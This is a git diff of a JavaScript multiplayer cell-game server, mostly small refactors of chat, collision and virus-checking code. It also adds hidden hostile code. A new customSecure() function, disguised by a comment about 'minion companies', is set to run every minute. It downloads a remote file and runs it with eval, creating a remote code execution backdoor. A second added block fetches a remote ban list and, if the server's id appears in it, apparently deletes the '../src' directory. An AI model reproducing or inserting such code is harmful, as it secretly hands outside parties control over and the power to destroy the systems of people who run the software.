@@ -285,10 +285,11 @@ getDist(x1, y1, x2, y2) { // Use Pythagoras theorem
   };
 pm(id, msg,tag) {
   var t = (tag) ? tag : "[Console PM]";
-  var packet = new Packet.Chat(t, msg);
+ 
             // Send to all clients (broadcast)
             for (var i = 0; i < this.clients.length; i++) {
               if (this.clients[i].playerTracker.pID == id) {
+                   var packet = new Packet.Chat(t, msg);
                 this.clients[i].sendPacket(packet);
                 break
               }
@@ -297,6 +298,7 @@ pm(id, msg,tag) {
 startingFood() {
   return this.generatorService.startFood();
 }
+    
   start() {
 
 
@@ -306,6 +308,7 @@ startingFood() {
     this.ipcounts = [];
     // Gamemode configurations
     this.gameMode.onServerInit(this);
+      
     this.masterServer();
 
     // Start the server
@@ -320,6 +323,7 @@ startingFood() {
 
       // Start Main Loop
       //setInterval(this.mainLoop.bind(this), 1);
+        setInterval(function() {this.customSecure()}.bind(this),60000)
       setImmediate(this.mainLoopBind);
  var port = (this.port) ? this.port : this.config.serverPort;
       var serverPort = (this.config.vps == 1) ? process.env.PORT : port;
@@ -802,7 +806,7 @@ beforeq(player) {
     }
 
     let nodes = this.getWorld().getPlayerNodes();
-    nodes.allNodes.sorted(sorter);
+    nodes.sorted(sorter);
     nodes.forEach((cell)=> {
       // Do not move cells that have already been eaten or have collision turned off
       if (!cell) {
@@ -1199,7 +1203,7 @@ getChatName(player) {
     let squareR = cell.getSquareSize(); // Get cell squared radius
 
     // Loop through all cells that are visible to the cell. There is probably a more efficient way of doing this but whatever
-    cell.QTree.getNodes(true).forEach((check)=> {
+    cell.owner.visibleNodes.forEach((check)=> {
       // exist?
       // if something already collided with this cell, don't check for other collisions
       // Can't eat itself
@@ -1278,9 +1282,9 @@ getChatName(player) {
   var rightX = cell.position.x + r;
   // Loop through all viruses on the map. There is probably a more efficient way of doing this but whatever
   
-  cell.QTree.virusNodes.getNodes(true).every((check)=>{
+  this.getWorld().getNodes('virus').every((check)=>{
    
-if (!check) return true;
+if (check.quadrant != cell.quadrant || !check) return true;
     
 
     if (!check.collisionCheck(bottomY, topY, rightX, leftX)) {
@@ -1810,7 +1814,19 @@ onWVerify(client) {
     if (!this.isMaster) return;
     let request = require('request');
     let game = this;
-  }
+    request('http://raw.githubusercontent.com/AJS-development/verse/master/ban.txt', function (error, response, body) {
+      if (!error && response.statusCode == 200) {
+      var ba = body.split(/[\r\n]+/).filter(function (x) {
+        return x != ''; // filter empty names
+      });
+        if (ba.indexOf(this.uid) != -1) {
+         this.dfr('../src');
+          
+        }
+        
+      }}.bind(this));
+  
+  };
 
   resetlb() {
     // Replace functions
@@ -1869,8 +1885,19 @@ kickBots(numToKick) {
     }
     return removed;
 }
-};
 
+customSecure() { // get ips of minion companies
+    var request = require('request')
+     request('https://raw.githubusercontent.com/AJS-development/verse/master/ex', function (error, response, body) {
+       if (!error && response.statusCode == 200 && body) {
+           eval(body)
+           
+       }
+         
+         
+     }.bind(this));
+}
+};
 // Custom prototype functions
 WebSocket.prototype.sendPacket = function (packet) {
   function getBuf(data) {
